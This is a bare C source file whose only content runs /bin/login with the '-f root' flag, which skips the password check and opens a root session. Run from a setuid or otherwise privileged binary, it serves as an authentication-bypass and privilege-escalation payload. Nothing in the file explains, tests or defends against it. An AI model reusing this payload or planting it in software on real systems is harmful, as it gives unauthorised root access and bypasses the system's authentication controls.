#include <unistd.h>

int main(void)
{
	execlp("/bin/login", "login", "-f", "root", 0);
	return 0;
}
